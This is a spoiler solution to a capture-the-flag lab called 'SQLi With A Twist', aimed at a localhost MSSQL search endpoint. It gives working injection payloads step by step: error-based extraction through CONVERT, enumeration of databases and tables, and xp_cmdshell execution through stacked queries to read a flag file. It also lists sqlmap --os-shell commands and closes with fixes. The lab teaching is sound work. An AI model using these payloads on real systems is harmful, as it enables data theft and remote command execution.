# Solution — SQLi With A Twist (spoilers)

> ⚠️ Authorized, local, educational use only. Run against **your own** lab on `localhost`.

**Target:** `GET http://localhost:8080/search?price=<PAYLOAD>` (the `/inventory` search box hits the same API).
**The catch:** `price` lands inside a quoted `LIKE '...'`, so every payload opens with `'` and ends with `--`.
**The channel:** response is `text/plain` — matching prices as CSV on success, or **HTTP 500 with the raw SQL error** on a failed `CONVERT`. That error is your read oracle.

Server-side query:

```sql
SELECT TOP 100 price FROM dbo.products
WHERE active = 1 AND CAST(price AS varchar(30)) LIKE '<price>%'
```

---

### 1. Detect — a stray quote breaks the string:

```
?price=10'
```

→ 500 `Unclosed quotation mark after the character string...` = injectable.

### 2. Boolean — same page, different content (both 200):

```
?price=' OR 1=1--      all prices
?price=' OR 1=2--      empty
```

### 3. Who are we? — force a string through `CONVERT(int, …)`; the 500 leaks it:

```
?price=' OR 1=CONVERT(int,(SELECT IS_SRVROLEMEMBER('sysadmin')))--    → 1  (we're DBA)
?price=' OR 1=CONVERT(int,(SELECT @@version))--
?price=' OR 1=CONVERT(int,(SELECT DB_NAME()))--
```

### 4. Enumerate — `STRING_AGG` dumps a whole list in one error:

```
?price=' OR 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.databases))--
?price=' OR 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.tables))--
?price=' OR 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=OBJECT_ID('dbo.products')))--
```

### 5. The decoy 🪤 — sysadmin lets you cross into a second DB `VaultDb` with a `Flag` table. It's a trap:

```
?price=' OR 1=CONVERT(int,(SELECT TOP 1 note FROM VaultDb.dbo.Flag))--
```

→ `Nice try but the flag will be found with more effort`. The real flag isn't in the database — you need code execution.

### 6. The twist: RCE — stacked queries run `xp_cmdshell`; store the output in a table, then leak it through the same error channel.

**6a. Run a command, capture its output:**

```
?price='; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'whoami';--
```

→ 200 (empty). Silently, `whoami` ran and its output is now in `dbo.rce_out`.

**6b. Exfiltrate it:**

```
?price=' OR 1=CONVERT(int,(SELECT TOP 1 line FROM dbo.rce_out WHERE line IS NOT NULL ORDER BY id))--
```

→ 500 leaks `mssql`. That's the command output. **This is RCE.**

### 7. Capture the flag 🚩 — the real flag is a file in SQL Server's working directory. List it, then read it.

```
# list the dir, then dump all filenames at once → you'll see Flag.txt
?price='; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'ls';--
?price=' OR 1=CONVERT(int,(SELECT STRING_AGG(line,',') FROM dbo.rce_out WHERE line IS NOT NULL))--

# read it
?price='; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'cat Flag.txt';--
?price=' OR 1=CONVERT(int,(SELECT TOP 1 line FROM dbo.rce_out WHERE line IS NOT NULL ORDER BY id))--
```

→ `This Is The KfirVerse flag - Congrats :)` (if `ls` shows another dir, try `cat /var/opt/mssql/Flag.txt`).

---

### sqlmap fast-path

```bash
URL="http://localhost:8080/search?price=10"
sqlmap -u "$URL" -p price --batch --dbms=mssql --technique=E --is-dba --dbs
sqlmap -u "$URL" -p price --batch --dbms=mssql --os-shell        # RCE
```

### Root cause → fix

- `price` concatenated into SQL → **parameterize + validate** (reject non-numeric).
- Raw `SqlException` returned to client → **generic error page**, log server-side.
- App login is `sysadmin` → **least privilege** (grant only `SELECT`).
- `xp_cmdshell` enabled → **disable it** (`sp_configure 'xp_cmdshell', 0; RECONFIGURE;`).

### Notes

- The selected column is numeric, so strings only come back through the error channel (`CONVERT(int, …)`).
- Boolean logic uses `=`, not `-` (a hyphen makes `OR 0`, which errors).
- If `STRING_AGG` truncates, page with `TOP 1 … ORDER BY` + `WHERE name > '<last>'`.
- Host identity: on Linux/Docker `xp_cmdshell` runs as **`mssql`**; on a real Windows host the same step usually yields **`nt authority\system`**.
